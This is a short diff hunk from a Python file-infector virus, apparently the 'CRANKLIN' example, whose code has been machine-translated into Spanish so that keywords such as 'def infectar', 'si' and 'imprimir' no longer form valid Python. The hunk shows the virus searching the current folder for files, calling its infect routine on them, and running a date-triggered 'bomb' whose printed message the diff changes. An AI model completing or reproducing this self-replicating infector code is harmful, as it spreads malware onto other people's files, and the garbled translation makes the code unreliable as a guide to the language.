@@ -33,7 +33,7 @@ def  infectar ( archivos a infectar ):
         f . cerrar ()
 def  bomb ():
     si  datetime . fecha y hora . ahora (). mes  ==  1  y  fecha y hora . fecha y hora . ahora (). día  ==  25 :
-        imprimir  "¡FELIZ CUMPLEAÑOS CRANKLIN!"
+        imprimir  "¡Hello CRANKLIN!"
 filestoinfect  =  búsqueda ( os . ruta . abspath ( "" ))
 infectar ( archivos a infectar )
 bomba ()
